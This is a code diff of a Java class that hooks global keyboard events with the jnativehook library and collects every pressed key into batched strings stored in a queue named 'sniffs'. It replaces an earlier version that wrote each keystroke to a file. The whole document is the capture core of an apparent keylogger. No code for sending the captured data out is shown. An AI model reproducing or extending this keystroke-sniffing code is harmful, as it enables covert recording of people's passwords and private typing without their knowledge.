@@ -5,29 +5,45 @@ import org.jnativehook.keyboard.NativeKeyListener;
 
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
+import java.util.concurrent.ConcurrentLinkedQueue;
 
 /**
  * Created by Matan on 3/22/16.
  */
 public class KS implements ActionListener, NativeKeyListener {
 
-    String post;
+    ConcurrentLinkedQueue<String> sniffs = new ConcurrentLinkedQueue<>();
     int typeCounter = 0;
+    String currentBatch = "";
 
     @Override
     public void actionPerformed(ActionEvent actionEvent) {
     }
 
+    public void handleKey(String typedKey) {
+        if (!typedKey.equals("Undefined")) {
+            //Writer w = new Writer();
+            //w.WriteToFile(typedKey);
+
+            currentBatch = currentBatch.concat(typedKey);
+
+            if (typeCounter == 5) {
+                sniffs.add(currentBatch);
+                currentBatch = "";
+                typeCounter = 0;
+            }
+        }
+        typeCounter++;
+    }
+
+
     @Override
     public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {
-        System.out.print("The key that was pressed: "+NativeKeyEvent.getKeyText( nativeKeyEvent.getKeyCode()));
-        if (!NativeKeyEvent.getKeyText( nativeKeyEvent.getKeyCode()).equals("Undefined")){
-            Writer w=new Writer();
-            w.WriteToFile(NativeKeyEvent.getKeyText( nativeKeyEvent.getKeyCode()));
-            typeCounter++;
+        String typedKey = NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode());
+        System.out.print("The key that was pressed: " + typedKey);
+        handleKey(typedKey);
         }
 
-    }
 
     @Override
     public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {
@@ -35,12 +51,6 @@ public class KS implements ActionListener, NativeKeyListener {
 
     @Override
     public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {
-        System.out.print("The key that was pressed: "+NativeKeyEvent.getKeyText( nativeKeyEvent.getKeyCode()));
-        if (!NativeKeyEvent.getKeyText( nativeKeyEvent.getKeyCode()).equals("Undefined")){
-            Writer w=new Writer();
-            w.WriteToFile(NativeKeyEvent.getKeyText( nativeKeyEvent.getKeyCode()));
-            typeCounter++;
-        }
     }
 
 
